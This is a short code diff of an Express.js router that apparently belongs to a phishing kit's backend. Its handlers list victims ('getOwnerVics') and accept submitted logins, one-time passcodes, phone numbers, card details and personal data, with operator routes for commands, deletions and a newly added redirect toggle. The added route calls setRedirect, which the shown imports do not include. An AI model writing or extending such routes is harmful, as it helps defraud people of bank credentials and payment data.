@@ -1,17 +1,17 @@
 const express = require("express");
 const {
-  getOwnerVics,
-  command,
-  getInfo,
-  deleteEntry,
-  submitLogin,
-  submitLoginAgain,
-  submitOtp,
-  submitPhone,
-  submitCard,
-  submitStaticLogin,
-  submitStaticCard,
-  submitStaticPersonal,
+	getOwnerVics,
+	command,
+	getInfo,
+	deleteEntry,
+	submitLogin,
+	submitLoginAgain,
+	submitOtp,
+	submitPhone,
+	submitCard,
+	submitStaticLogin,
+	submitStaticCard,
+	submitStaticPersonal,
 } = require("../controllers/santsController");
 const router = express.Router();
 
@@ -28,5 +28,6 @@ router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/delete", deleteEntry);
 router.post("/", command);
+router.get("/redirect/:active", setRedirect);
 
 module.exports = router;
